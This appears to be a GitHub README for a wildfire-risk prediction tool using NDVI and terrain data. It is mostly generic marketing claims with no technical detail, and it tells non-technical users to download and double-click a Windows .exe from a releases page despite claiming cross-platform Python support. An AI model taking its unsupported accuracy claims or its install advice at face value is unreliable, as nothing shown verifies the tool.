## 🚀 Getting Started

Welcome to the spatiotemporal-wildfire-ga project. This application predicts wildfire risk by analyzing NDVI (Normalized Difference Vegetation Index) and terrain features using a powerful machine learning pipeline. It is designed for users who want to assess wildfire risk without needing technical skills.

## 💡 Features

- **User-Friendly Interface**: Easy navigation for all users, regardless of skill level.
- **Accurate Predictions**: Utilizes advanced machine learning techniques for reliable results.
- **Visualizations**: Offers clear and informative graphical outputs for better understanding.
- **Customizable Parameters**: Adjust settings to match your specific needs.

## 🏗️ System Requirements

To run this application, ensure your system meets the following minimum requirements:

- **Operating System**: Windows 10 or newer, macOS, or a recent Linux distribution.
- **RAM**: At least 4 GB (8 GB recommended for larger datasets).
- **Storage**: Minimum of 500 MB of free disk space.
- **Dependencies**: Python 3.8 or newer, along with the necessary libraries (these will install automatically).

## 📥 Download & Install

To download the application, visit the following link:

[Download the latest release here.](https://github.com/Tian-nuy/spatiotemporal-wildfire-ga/releases)

1. Click on the link to go to the releases page.
2. Look for the most recent version listed.
3. Select the appropriate file for your operating system:
   - For Windows, download the `.exe` file.

4. Once downloaded, locate the file and double-click it to start the installation process.

## 🔄 Usage Instructions

Once installed, launch the application. You will see a simple interface with options to select your data inputs.

- **Input Data**: You can upload your NDVI and terrain datasets directly.
- **Adjust Settings**: Modify parameters, such as prediction range and feature selection.
- **Run Prediction**: Click the "Predict" button to start the analysis.

The application will display the results clearly, allowing you to visualize wildfire risk in your selected area.

## 📊 Understanding the Results

After the prediction runs, the application will provide you with various outputs:

- **Heat Maps**: These show areas of high, medium, and low wildfire risk.
- **Statistical Summaries**: Key figures summarizing risk levels and factors.
- **Export Options**: Save your results as PDFs or images for reporting.
